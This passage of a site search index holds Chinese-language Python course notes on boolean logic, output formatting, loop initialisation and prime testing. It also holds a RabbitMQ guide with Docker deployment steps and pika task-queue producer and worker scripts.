\u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570 a , n = int ( a ), int ( n ) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b multiply = 1 res = 0 for i in range ( n ): res += a * multiply multiply *= 10 return res a = '5' n = 4 s = 0 for i in range ( 2 , n + 1 , 2 ): s += getna ( a , i ) print ( s ) \u5f53\u7136\u8fd9\u4e2a\u9898\u76ee\u6709\u7b80\u5316\u505a\u6cd5\uff1a n\u4e2aa\u8fd9\u4e2a\u6574\u6570\u7528 \u5b57\u7b26\u4e32\u4e58\u4ee5\u6570\u5b57\u5f97\u5230\u5b57\u7b26\u4e32 \u518dint\u8f6c\u6574\u6570 int(str(a)*int(n)) \u4ece2\u5230n\u6bcf\u6b21\u9012\u589e2\uff0c\u7528range(2,n+1,2) \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5217\u8868\u6c42\u548c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528sum\u51fd\u6570\uff0crange\u8fd4\u56de\u7684\u4e1c\u897f\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u5217\u8868\uff0c \u5217\u8868\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u5217\u8868\u7528\u5217\u8868\u63a8\u5bfc\u5f0f\u5c31\u884c \u5199\u6cd5\uff1a[something(i) for i in \u2026] a = '5' n = 4 print ( sum ([ int ( str ( a ) * int ( i )) for i in range ( 2 , n + 1 , 2 ) ]) )","title":"\u5b66\u4f1a\u62c6\u5206\u95ee\u9898 \u5927\u800c\u5316\u5c0f"},{"location":"PythonCourse/#andor","text":"and\u7684\u4f18\u5148\u7ea7\u6bd4or\u9ad8 x = 5 y = False z = False print ( x or y and z ) \u8fd9\u4e2a\u7b49\u4ef7\u4e8eprint(x or (y and z)) \u5148\u8ba1\u7b97False and False\u662fFalse\uff0c\u7136\u540ex or False\u56e0\u4e3ax\u662f\u771f\u7684 \u7ed3\u679c\u5c31\u662fx \u8f93\u51fa5","title":"\u6df7\u5728\u4e00\u8d77\u7684and\u548cor"},{"location":"PythonCourse/#a-and-b","text":"\u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56deb\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56dea >>> 1 and 6 6 >>> [] and 6 []","title":"a and b"},{"location":"PythonCourse/#a-or-b","text":"\u8fd4\u56de\u7684\u53ea\u53ef\u80fd\u662fa\u548cb\u4e4b\u95f4\u7684\u4e00\u4e2a\uff0ca\u662f\u771f\u7684\u5c31\u8fd4\u56dea\uff0ca\u662f\u5047\u7684\u5c31\u8fd4\u56deb >>> 1 or 6 1 >>> [].sort() or 6 6 \u8fd8\u8bb0\u5f97\u4e0a\u9762\u8bf4\u7684.sort()\u8fd4\u56deNone\u5417\uff1f None\u662f\u5047\u7684\u5662","title":"a or b"},{"location":"PythonCourse/#_25","text":"0\u662f\u5047\u7684\uff0c\u7a7a\u7684\u4e1c\u897f '', [], {} \u662f\u5047\u7684\uff0cFalse\u662f\u5047\u7684\uff0cNone\u662f\u5047\u7684\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u771f\u7684 \u641c\u7d22python False values\u53ef\u4ee5\u641c\u5230 https://docs.python.org/3/library/stdtypes.html Any object can be tested for truth value, for use in an if or while condition or as operand of the Boolean operations below. By default, an object is considered true unless its class defines either a bool () method that returns False or a len () method that returns zero, when called with the object. 1 Here are most of the built-in objects considered false: constants defined to be false: None and False. zero of any numeric type: 0, 0.0, 0j, Decimal(0), Fraction(0, 1) empty sequences and collections: \u2018\u2019, (), [], {}, set(), range(0) Operations and built-in functions that have a Boolean result always return 0 or False for false and 1 or True for true, unless otherwise stated. (Important exception: the Boolean operations or and and always return one of their operands.)","title":"\u54ea\u4e9b\u4e1c\u897f\u662f\u5047\u7684\uff1f"},{"location":"PythonCourse/#_26","text":"\u65b9\u6cd5\u662f \u590d\u5236\u4e00\u4e0b\u9898\u76ee\u7684\u8f93\u51fa\u6837\u4f8b \uff0c\u770b\u770b\u5230\u5e95\u6700\u540e\u6709\u6ca1\u6709\u7a7a\u683c","title":"\u884c\u672b\u5230\u5e95\u8981\u4e0d\u8981\u8f93\u51fa\u7a7a\u683c"},{"location":"PythonCourse/#_27","text":"\u5982\u679c\u53ef\u4ee5\u8f93\u51fa\u7a7a\u683c\uff0c\u7b80\u5355 \u5faa\u73af\u91cc\u9762print(item, end=\u2019 \u2018)\u5c31\u884c \u4e3e\u4e2a\u4f8b\u5b50\u5427\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3 \uff0c\u672b\u5c3e\u8981\u6709\u7a7a\u683c \u7528print\u8bb0\u5f97end\u53c2\u6570\u8981\u5199\u4e0a\uff0c\u5426\u5219\u5c31\u6362\u884c\u4e86 for i in range ( 1 , 4 ): print ( i , end = ' ' )","title":"\u600e\u6837\u505a\u5230\u672b\u5c3e\u4e0d\u8f93\u51fa\u7a7a\u683c"},{"location":"PythonCourse/#1resultprintresult","text":"\u9898\u76ee\u8981\u6c42\u6211\u4eec\u8f93\u51fa1 2 3\uff0c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c result = [] for i in range ( 1 , 4 ): result . append ( i ) print ( * result ) \u8fd9\u91cc\u7528\u5230\u4e86\u7b26\u53f7 * \uff0c\u5728\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u4f7f\u7528\u661f\u53f7\u8868\u793a\u628a\u8fd9\u4e2a\u6570\u7ec4\u62c6\u5f00\uff0c\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570 \u5047\u8bbe result=[1,2,3] \uff0c print([1,2,3]) \u4f1a\u8f93\u51fa [1, 2, 3] \u4e24\u8fb9\u6709\u65b9\u6846 \u4e0d\u662f\u6211\u4eec\u8981\u7684 \u8bd5\u8bd5 print(*[1,2,3]) \u4f1a\u8f93\u51fa 1 2 3 \u5b83\u5c31\u7b49\u4ef7\u4e8e print(1,2,3) \u770b\uff0c\u5217\u8868\u7684\u6bcf\u4e2a\u5143\u7d20\u4ece\u6570\u7ec4\u7684\u675f\u7f1a\u4e2d\u89e3\u8131\u51fa\u6765\uff0c\u76f4\u63a5\u5f53\u6210print\u7684\u53c2\u6570\u4e86\uff01","title":"\u65b9\u68481\uff1a\u628a\u8981\u8f93\u51fa\u7684\u4e1c\u897f\u6682\u65f6\u5b58\u5230\u6570\u7ec4result\u91cc\uff0c\u6700\u540eprint(*result)"},{"location":"PythonCourse/#2","text":"\u6bd4\u5982\u8981\u8f93\u51fa 1 2 3 \uff0c\u6211\u4eec\u8fd9\u4e48\u770b\u5f85\uff1a 1/\u7a7a\u683c2/\u7a7a\u683c3 \u4e3a\u5565\u8fd9\u6837\u770b\u5462\uff1f\u4e3a\u5565\u4e0d\u770b\u6210\u662f 1\u7a7a\u683c/2\u7a7a\u683c/3 \u5462\uff1f\u56e0\u4e3a\u5faa\u73af\u5565\u65f6\u5019\u7ed3\u675f\u5f88\u53ef\u80fd\u662f\u4f60\u4e0d\u77e5\u9053\u7684\uff0c\u4f60\u5c31\u65e0\u6cd5\u5224\u65ad\u5f53\u524d\u5143\u7d20\u662f\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u3002 \u4f46\u662f\u4f60\u4e00\u5b9a\u77e5\u9053\u54ea\u4e2a\u5143\u7d20\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u554a\uff01 isfirst = True for i in range ( 1 , 4 ): if isfirst : # \u7b2c\u4e00\u4e2a\u5143\u7d20 print ( i , end = '' ) isfirst = False else : # \u540e\u7eed\u7684\u5143\u7d20 \u5148\u8f93\u51fa\u4e00\u4e2a\u7a7a\u683c print ( '' , i , end = '' ) #\u7b49\u4ef7\u4e8eprint(' '+str(i), end='')","title":"\u65b9\u68482\uff1a\u533a\u5206\u9996\u5143\u7d20\u548c\u5176\u540e\u7684\u5143\u7d20"},{"location":"PythonCourse/#printn","text":"\u4e0a\u9762\u6211\u4eec\u90fd\u662f\u5728\u4e00\u884c\u91cc\u8f93\u51fa\uff0c\u73b0\u5728\u6211\u4eec\u8981\u5f00\u59cb\u4e0b\u4e00\u884c\u4e86\uff0c\u4f60\u5f88\u53ef\u80fd\u60f3 print('\\n') \u8fd9\u4e2a\u5b9e\u9645\u4e0a\u662f print('\\n', end='\\n') \u56e0\u4e3a\u4f60\u6ca1\u6709\u63d0\u4f9bend\u53c2\u6570\uff0cend\u5c31\u9ed8\u8ba4\u662f\u4e00\u4e2a\u6362\u884c\uff0c\u4f60\u81ea\u5df1\u53c8\u663e\u793a\u4e86\u4e2a\u6362\u884c\uff0c\u90a3\u5c31\u662f\u4e24\u4e2a\\n\u4e86\uff01 \u4e24\u4e2a\\n\uff01\u5148\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u518d\u8fdb\u5165\u4e0b\u4e00\u884c\uff0c\u4e0d\u5c31\u663e\u793a\u4e86\u4e00\u4e2a\u591a\u4f59\u7684\u7a7a\u884c\u4e86\u561b\uff01 \u89e3\u51b3\u65b9\u6848\uff1a print() \u591a\u7b80\u5355","title":"\u5982\u4f55\u6b63\u786e\u5730\u6362\u884c print('\\n')\u662f\u4e0d\u884c\u7684"},{"location":"PythonCourse/#_28","text":"\u5faa\u73af\u4f9d\u8d56\u7684\u53d8\u91cf\u7684\u521d\u59cb\u5316\u2014\u2014\u4e00\u5b9a\u8981\u5728\u5faa\u73af\u5f00\u59cb\u4e4b\u524d\u505a\uff01\u4e0d\u80fd\u5728\u5916\u9762\u5faa\u73af\u4e4b\u524d\u505a\uff01 t = int ( input ()) cnt = 0 lst = [] #\u50a8\u5b58\u7ed3\u679c \uff0c \u6700\u540e\u4e00\u8d77\u8f93\u51fa for i in range ( t ) : n = int ( input ()) mat = [] for j in range ( n ) : mat . append ( input (). split ()) for row in range ( 1 , n ) : for col in range ( 0 , n - 1 ) : if row > col and mat [ row ][ col ]== '0' : cnt += 1 if cnt == ( n ** 2 - n ) / 2 : str = \"YES\" else : str = \"NO\" lst . append ( str ) for z in lst : print ( z ) \u4f8b\u5982\u8fd9\u4e2a\u5224\u65ad\u4e0a\u4e09\u89d2\u7684\uff0c\u5148\u770b\u8fd9\u4ee3\u7801\u7684\u672c\u8d28\u2014\u2014\u5faa\u73af\u91cc\u9762\u6709\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\uff08range t\uff09\u662f\u591a\u4e2a\u77e9\u9635\uff0c\u5185\u5c42\u5faa\u73af\uff08row\u548ccol\uff09\u7528\u6765\u904d\u5386\u77e9\u9635 \u90a3\u95ee\u9898\u6765\u4e86\uff0c\u5185\u5c42\u5faa\u73af\u7684cnt\u4f5c\u7528\u5728\u5355\u4e2a\u77e9\u9635\u91cc\u9762\uff0c\u4e0d\u540c\u77e9\u9635\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u5e72\u6270\uff0c\u4e5f\u5c31\u662f\u8bf4cnt\u5e94\u8be5\u5728\u8fdb\u5165row\u5faa\u73af\u4e4b\u524d\u521d\u59cb\u5316\uff01\u628acnt=0\u79fb\u52a8\u5230\u7b2c9\u884c\u4e4b\u524d\u5373\u53ef \u518d\u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u8981\u8ba1\u7b97\u591a\u4e2a\u73ed\u7ea7\u5206\u522b\u7684\u5e73\u5747\u5206\uff0c\u9700\u8981\u5bf9\u73ed\u7ea7\u5185\u7684\u6bcf\u4e2a\u5b66\u751f\u7d2f\u52a0\u5230sum_score\uff0c\u90a3\u4f60\u5c31\u9700\u8981\u5728 \u8fdb\u5165\u8fd9\u4e2a\u73ed\u7ea7\u7684\u5faa\u73af\u540e \u5bf9\u73ed\u7ea7\u5185\u6bcf\u4e2a\u5b66\u751f\u904d\u5386\u7684\u5faa\u73af\u524d \u5bf9sum_score \u8fdb\u884c\u521d\u59cb\u5316 sum_score=0\uff1b\u5982\u679c\u4f60\u63d0\u65e9\u505a\u4e86\uff0c\u4e0a\u4e2a\u73ed\u7ea7\u7684\u603b\u5206\u5c31\u4f1a\u52a0\u5165\u5230\u4e0b\u4e2a\u73ed\u7ea7\uff0c\u4e0d\u5408\u9002\u5427 n=int(input()) data=[int(input()) for i in range(n)] a=2 for i in data: while a<i: if i%a==0: print('No') break a=a+1 else: print('Yes') \u8fd9\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u6bcf\u4e2a\u7d20\u6570\u7684\u5224\u65ad\u5e94\u8be5\u662f\u72ec\u7acb\u7684\uff0c\u9700\u8981\u628aa=2\u79fb\u52a8\u5230 for i in data: \u5faa\u73af\u5f00\u59cb\u4e4b\u540e while a<i \u5faa\u73af\u5f00\u59cb\u4e4b\u524d \u7b80\u800c\u8a00\u4e4b\uff1a\u54ea\u4e2a\u5faa\u73af\u8d1f\u8d23\u8fd9\u4e2a\u53d8\u91cf\uff0c\u5c31\u5728\u8fd9\u4e2a\u5faa\u73af\u4e4b\u524d\u505a\u521d\u59cb\u5316\uff0c\u4fdd\u8bc1\u5916\u5c42\u5faa\u73af\u4e92\u4e0d\u5e72\u6270","title":"\u5faa\u73af\u521d\u59cb\u5316 \u653e\u5728\u6b63\u786e\u7684\u4f4d\u7f6e"},{"location":"PythonCourse/#_29","text":"\u522b\u4ee5\u4e3a\u522b\u7684\u9898\u76ee\u6587\u672c\u91cc\u51fa\u73b0\u4e86\u4e2d\u6587\u5f15\u53f7\u4f60\u5c31\u80fd\u7528\uff0c\u9898\u76ee\u4e0d\u4e25\u8c28\u4e0d\u4ee3\u8868\u4f60\u80fd\u4e0d\u4e25\u8c28","title":"\u586b\u7a7a\u9898\u522b\u51fa\u73b0\u4e2d\u6587\u5f15\u53f7"},{"location":"PythonCourse/#_30","text":"\u5982\u679c\u4f60\u8fd8\u4e0d\u4f1a\uff0c\u5efa\u8bae\u80cc\u4e0b\u6765\u6807\u51c6\u7b54\u6848\uff1a\u53ea\u8981\u9047\u5230\u9700\u8981\u5224\u65ad\u7d20\u6570\u7684\u9898\u76ee\uff0c\u5148\u9ed8\u5199\u8fd9\u4e2aisPrime\u51fd\u6570 \u8bb0\u5fc6\u53e3\u8bc0\uff1a1\u4e0d\u662f\uff0c2\u662f\uff0c\u4ece2\u5230(\u6839\u53f7n) + 1 import math def isPrime ( n ): if n == 1 : return False if n == 2 : return True for i in range ( 2 , int ( math . sqrt ( n ) + 1 )): if n % i == 0 : return False return True \u4e0d\u8981\u628a\u7d20\u6570\u5224\u65ad\u7684\u4ee3\u7801\u548c\u5176\u4ed6\u4ee3\u7801\u6df7\u5728\u4e00\u8d77\uff0c\u6c42\u6c42\u4f60\u5199\u4e2a\u51fd\u6570\u5427\uff01 \u5199\u4e86\u51fd\u6570\u4e4b\u540e\u4f60\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u51fd\u6570\u53bb\u6d4b\u8bd5\u554a\uff0c\u5982\u56fe\u6240\u793a\uff0c\u6211\u5199\u4e86\u4e4b\u540e\u5c31\u4f1a\u81ea\u5df1\u6784\u9020\u4e00\u4e9b\u6570\u636e\u53bb\u6d4b\u8bd5\u3002 \u6d4b\u8bd5 \u6d4b\u8bd5 \u6d4b\u8bd5 >>> import math >>> def isPrime ( n ): ... if n == 1 : ... return False ... if n == 2 : ... return True ... for i in range ( 2 , int ( math . sqrt ( n ) + 1 )): ... if n % i == 0 : ... return False ... return True ... >>> isPrime ( 1 ) False >>> isPrime ( 2 ) True >>> isPrime ( 3 ) True >>> isPrime ( 4 ) False >>> isPrime ( 5 ) True >>> isPrime ( 6 ) False >>> isPrime ( 101 ) True >>> isPrime ( 100 ) False","title":"\u600e\u4e48\u6b63\u786e\u5730\u5224\u65ad\u7d20\u6570"},{"location":"PythonCourse/#_31","text":"","title":"\u8fd0\u884c\u8d85\u65f6\u600e\u4e48\u7834\uff1f"},{"location":"PythonCourse/#_32","text":"\u4e0d\u8981\u4ece2\u5230n-1\uff0c\u6839\u53f7n\u5c31\u884c\u4e86","title":"\u8bb0\u4f4f\u5224\u65ad\u7d20\u6570\u53ef\u4ee5\u5f00\u6839\u53f7\u554a\uff01"},{"location":"PythonCourse/#_33","text":"\u9a8c\u8bc1\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u4e00\u9898 \u9898\u76ee\u8bf4 \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa\u4e00\u4e2a(2, 2 000 000 000]\u8303\u56f4\u5185\u7684\u5076\u6570N\u3002 \u54c7 \u597d\u591a0\uff0c\u6570\u4e00\u6570\u8fd9\u662f20\u4ebf\u554a\uff0c\u653e\u4e00\u4e2a\u8fd9\u4e48\u5927\u7684\u4e0a\u754c\u5728\u8fd9\u91cc\u5e72\u5565\u554a\uff1f\u53ea\u662f\u597d\u770b\u561b\uff1f \u80af\u5b9a\u662f\u6709\u4e00\u4e2a\u6d4b\u8bd5\u70b9\u4f1a\u8f93\u5165\u8fd9\u4e2a20\u4ebf\uff0c\u4f60\u81ea\u5df1\u672c\u5730\u6d4b\u8bd5\u4f60\u7684\u4ee3\u7801\u5c31\u4e00\u5b9a\u8981\u8bd5\u8bd5 \u7136\u540e\u5c31\u53d1\u73b0\u4f60\u7684\u7a0b\u5e8f\u597d\u4e45\u6ca1\u53cd\u5e94\uff0c\u5c31\u5e94\u8be5\u4f18\u5316\u4e86","title":"\u9898\u76ee\u7ed9\u7684\u4e0a\u754c\u4e00\u5b9a\u4f1a\u6709\u6d4b\u8bd5\u70b9"},{"location":"PythonCourse/#_34","text":"\u8fd8\u662f\u54e5\u5fb7\u5df4\u8d6b\u731c\u60f3\u8fd9\u4e2a\u9898\u76ee\uff0c\u4f60\u89c9\u5f97\u9700\u8981\u6c42\u51fa\u5c0f\u4e8eN\u7684\u6240\u6709\u7d20\u6570\u561b\uff1f\u7136\u540e\u5728\u8fd9\u4e2a\u7d20\u6570\u6570\u7ec4\u91cc\u6c42\u6c42\u548c\uff1f \u5f53\u7136\u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u9519\uff0c\u53ea\u662f\u592a\u6162\u4e86\uff0c\u8981\u6c42\u51fa20\u4ebf\u4ee5\u5185\u7684\u6240\u6709\u7d20\u6570\uff0c\u8fd9\u4e2a\u592a\u8d35\u4e86\uff08\u592a\u8017\u65f6\u4e86\uff0c\u65f6\u95f4\u5c31\u662f\u91d1\u94b1\u554a\uff09 \u6211\u4eec\u7684\u76ee\u6807\u53ea\u662f\u7ed9\u51fa\u4e00\u4e2aN=p+q\u5c31\u884c\uff0c\u53ea\u8981\u4ece2\u5f00\u59cb\u627e\u7d20\u6570p\uff0c\u7136\u540e\u9a8c\u8bc1N-p\u4e5f\u662f\u7d20\u6570\u5373\u53ef","title":"\u60f3\u60f3\u600e\u4e48\u7b80\u5316\u8ba1\u7b97"},{"location":"PythonCourse/#python-homework-review","text":"PDF\u4e0b\u8f7d \u63d0\u7eb2\uff1a Python\u548cC\u8bed\u8a00\u4e0d\u540c\u7684\u5730\u65b9 \u7a0b\u5e8f\u8f93\u51fa\u5565\uff1f\u628a\u81ea\u5df1\u5f53\u6210Python\u89e3\u91ca\u5668 \u5199\u8349\u7a3f \u5c40\u90e8\u53d8\u91cf \u51fd\u6570\u91cc\u88ab\u8d4b\u503c\u4e86\u7684\u5c31\u662f\u5c40\u90e8\u53d8\u91cf \u5bf9\u9f50 {0:T^20} \u7528T\u8865\u9f5020\u4f4d \u5c45\u4e2d \u7f16\u7a0b\u9898\u8003\u8bd5\u6280\u5de7\uff1a \u4e00\u6b65\u6b65\u5199\uff0c\u5199\u4e00\u70b9\u5c31\u4fa7\u4e00\u70b9 \u5185\u7f6e\u51fd\u6570\u719f\u7ec3\u638c\u63e1 \u5982sum \u6ce8\u610f\u7a7a\u683c \u4e0d\u8981\u6d6a\u8d39\u65f6\u95f4\u5728\u683c\u5f0f\u9519\u8bef\u4e0a \u4ed4\u7ec6\u8bfb\u9898 \u4e00\u904d\u4e0d\u884c\u591a\u8bfb\u51e0\u904d \u770b\u770b\u4e0a\u754c\uff08\u4e00\u822c\u7528\u4e0d\u7740\uff09 \u63d0\u53d6\u51fa\u51fd\u6570\uff0c\u964d\u4f4e\u601d\u7ef4\u8d1f\u62c5 \u9012\u5f52\u51fd\u6570\u600e\u4e48\u5199\uff1f\u60f3\u6e05\u695a \u53c2\u6570 \u8fd4\u56de\u503c \u7684\u542b\u4e49 \u5b9e\u5728\u641e\u4e0d\u5b9a\uff1f\u522b\u653e\u5f03\uff0c\u9a97\u5206\uff01 \u9700\u8981\u8bb0\u4f4f\u70b9\u5565\uff1f \u7c7b\u578b\uff1ainput()\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u7528int, float\u8f6c\u6362\uff1b\u7528isinstance\u5224\u65ad\u7c7b\u578b\uff1b\u54ea\u4e9b\u662fFalse \u6570\u5b57\uff1a\u9664\u4ee50\u7684\u5f02\u5e38\uff0c\u8fdb\u5236\u8f6c\u6362\uff0c\u5224\u65ad\u7d20\u6570\uff0c\u683c\u5f0f\u5316\u8f93\u51fa\uff0c\u4f18\u5148\u7ea7 \u5b57\u7b26\u4e32\uff1alen\uff0cupper\uff0clower\uff0cstrip\uff0csplit\uff0cjoin \u5217\u8868\uff1aappend\uff0cindex\uff0csorted(key=lambda i:-i)\uff0c\u6570\u7ec4\u7684\u6570\u7ec4\uff0c\u5206\u7247\uff0c [::-1] \uff0c\u5217\u8868\u63a8\u5bfc\u5f0f \u5b57\u5178\uff1akeys\uff0citems\uff0cupdate \u5faa\u73af\uff1arange\uff0cfor i in \u2026\uff0cwhile \u2026\uff0c\u53d8\u91cf\u521d\u59cb\u5316 \u51fd\u6570\uff1a\u4f20\u9012\u4e00\u4e2a\u5217\u8868\uff1f\uff08\u5f15\u7528\u4f20\u9012\uff09\u5c40\u90e8\u53d8\u91cf\uff0c\u5168\u5c40\u53d8\u91cf tuple\uff1bset\uff1b\u6587\u4ef6\uff1b\u7c7b","title":"Python Homework Review"},{"location":"RabbitMQ/","text":"RabbitMQ \u6d88\u606f\u961f\u5217 \u00b6 Docker\u90e8\u7f72 \u00b6 \u5fc5\u987b\u8bbe\u7f6e\u4e3b\u673a\u540d \u2013hostname \u6570\u636e\u5377\u6620\u5c04 \u4f7f\u7528macvlan\u5206\u914dIP \u914d\u7f6e\u7528\u6237\u5bc6\u7801 \u914d\u7f6e\u7528\u6237\u5bc6\u7801\u5fc5\u987b\u8981\u6c42\u6570\u636e\u6587\u4ef6\u5939\u4e3a\u7a7a\uff0c\u5426\u5219\u4e0d\u4f1a\u751f\u6548 rm - rf / docker / rabbitmq / docker run - d -- hostname rabbit -- name rmq - v / docker / rabbitmq / : / var / lib / rabbitmq -- network macvlan_bridge -- ip 192.168 . 1.18 -- dns 192.168 . 1.1 - e RABBITMQ_DEFAULT_USER = user - e RABBITMQ_DEFAULT_PASS = password rabbitmq \u6d88\u8d39\u8005\u7ade\u4e89\u7684\u4efb\u52a1\u63a8\u9001\u6267\u884c \u00b6 \u4f8b\u5982\u53d1\u9001\u53c2\u65701,2\u5230\u6d88\u8d39\u8005\u6267\u884c add(a,b) \u51fd\u6570\uff0c\u6bcf\u4e2a\u6d88\u8d39\u8005\u6700\u591a\u63a5\u53d7\u4e00\u4e2a\u4efb\u52a1 config.py \u914d\u7f6e\u4fe1\u606f \u00b6 \u4e0e\u4e0a\u8ff0docker\u542f\u52a8\u65f6\u914d\u7f6e\u7684\u4e00\u81f4 RMQ_HOST = \"192.168.1.18\" RMQ_PORT = 5672 RMQ_USER = \"user\" RMQ_PASSWORD = \"password\" task.py \u53d1\u9001\u4efb\u52a1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #!/usr/bin/env python import pika import sys import json from config import RMQ_HOST , RMQ_PORT , RMQ_USER , RMQ_PASSWORD QUEUE_NAME = 'add_task_queue' params = pika . ConnectionParameters ( host = RMQ_HOST , port = RMQ_PORT , credentials = pika . credentials . PlainCredentials ( RMQ_USER , RMQ_PASSWORD ) ) connection = pika . BlockingConnection ( params ) channel = connection . channel () channel . queue_declare ( queue = QUEUE_NAME , durable = True ) def queue_put ( func_args ): #func_args:\u51fd\u6570\u53c2\u6570list message = json . dumps ( func_args ) return channel . basic_publish ( exchange = '' , routing_key = QUEUE_NAME , body = message , properties = pika . BasicProperties ( delivery_mode = 2 , # make message persistent )) if __name__ == '__main__' : queue_put ([ 1 , 2 ]) connection . close () \u67e5\u770b\u961f\u5217\u72b6\u6001 \u00b6 \u67e5\u770b\u961f\u5217\u540d\u79f0 \u51c6\u5907\u53d1\u9001\u7684\u6570\u91cf \u6ca1\u6709ack\u7684\u6570\u91cf docker exec rmq rabbitmqctl list_queues name messages_ready messages_unacknowledged worker.py \u6267\u884c\u4efb\u52a1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #!/usr/bin/env python import pika import time import json from config import RMQ_HOST , RMQ_PORT , RMQ_USER , RMQ_PASSWORD QUEUE_NAME = 'add_task_queue' params = pika . ConnectionParameters ( host = RMQ_HOST , port = RMQ_PORT , credentials = pika . credentials . PlainCredentials ( RMQ_USER , RMQ_PASSWORD ) ) connection = pika . BlockingConnection ( params ) channel = connection . channel () channel . queue_declare ( queue = QUEUE_NAME , durable = True ) print ( ' [*] Waiting for messages. To exit press CTRL+C' ) def add ( a , b ): return a + b def save_result ( args , result ): print ( \"save_result for\" , args , \":\" , result ) pass # using mysql or whatever storage... def callback ( ch , method , properties , body ): print ( \" [x] Received %r \" % body ) args = json . loads ( body . decode ()) result = add ( * args ) save_result ( args , result ) print ( \" [x] Done\" ) ch . basic_ack ( delivery_tag = method . delivery_tag ) channel . basic_qos ( prefetch_count = 1 ) channel . basic_consume ( callback , queue = QUEUE_NAME ) channel . start_consuming () \u4ee3\u7801\u6765\u81ea\u5b98\u65b9\u6559\u7a0b\uff1a https://www.rabbitmq.com/tutorials/tutorial-two-python.html","title":"RabbitMQ"},{"location":"RabbitMQ/#rabbitmq","text":"","title":"RabbitMQ \u6d88\u606f\u961f\u5217"},{"location":"RabbitMQ/#docker","text":"\u5fc5\u987b\u8bbe\u7f6e\u4e3b\u673a\u540d \u2013hostname \u6570\u636e\u5377\u6620\u5c04 \u4f7f\u7528macvlan\u5206\u914dIP \u914d\u7f6e\u7528\u6237\u5bc6\u7801 \u914d\u7f6e\u7528\u6237\u5bc6\u7801\u5fc5\u987b\u8981\u6c42\u6570\u636e\u6587\u4ef6\u5939\u4e3a\u7a7a\uff0c\u5426\u5219\u4e0d\u4f1a\u751f\u6548 rm - rf / docker / rabbitmq / docker run - d -- hostname rabbit -- name rmq - v / docker / rabbitmq / : / var / lib / rabbitmq -- network macvlan_bridge -- ip 192.168 . 1.18 -- dns 192.168 . 1.1 - e RABBITMQ_DEFAULT_USER = user - e RABBITMQ_DEFAULT_PASS = password rabbitmq","title":"Docker\u90e8\u7f72"},{"location":"RabbitMQ/#_1","text":"\u4f8b\u5982\u53d1\u9001\u53c2\u65701,2\u5230\u6d88\u8d39\u8005\u6267\u884c add(a,b) \u51fd\u6570\uff0c\u6bcf\u4e2a\u6d88\u8d39\u8005\u6700\u591a\u63a5\u53d7\u4e00\u4e2a\u4efb\u52a1","title":"\u6d88\u8d39\u8005\u7ade\u4e89\u7684\u4efb\u52a1\u63a8\u9001\u6267\u884c"},{"location":"RabbitMQ/#configpy","text":"\u4e0e\u4e0a\u8ff0docker\u542f\u52a8\u65f6\u914d\u7f6e\u7684\u4e00\u81f4 RMQ_HOST = \"192.168.1.18\" RMQ_PORT = 5672 RMQ_USER = \"user\" RMQ_PASSWORD = \"password\"","title":"config.py \u914d\u7f6e\u4fe1\u606f"},{"location":"RabbitMQ/#taskpy","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #!/usr/bin/env python import pika import sys import json from config import RMQ_HOST , RMQ_PORT , RMQ_USER , RMQ_PASSWORD QUEUE_NAME = 'add_task_queue' params = pika . ConnectionParameters ( host = RMQ_HOST , port = RMQ_PORT , credentials = pika . credentials . PlainCredentials ( RMQ_USER , RMQ_PASSWORD ) ) connection = pika . BlockingConnection ( params ) channel = connection . channel () channel . queue_declare ( queue = QUEUE_NAME , durable = True ) def queue_put ( func_args ): #func_args:\u51fd\u6570\u53c2\u6570list message = json . dumps ( func_args ) return channel . basic_publish ( exchange = '' , routing_key = QUEUE_NAME , body = message , properties = pika . BasicProperties ( delivery_mode = 2 , # make message persistent )) if __name__ == '__main__' : queue_put ([ 1 , 2 ]) connection . close ()","title":"task.py \u53d1\u9001\u4efb\u52a1"},{"location":"RabbitMQ/#_2","text":"\u67e5\u770b\u961f\u5217\u540d\u79f0 \u51c6\u5907\u53d1\u9001\u7684\u6570\u91cf \u6ca1\u6709ack\u7684\u6570\u91cf docker exec rmq rabbitmqctl list_queues name messages_ready messages_unacknowledged","title":"\u67e5\u770b\u961f\u5217\u72b6\u6001"},{"location":"RabbitMQ/#workerpy","text":"1 2 3 4 5 6 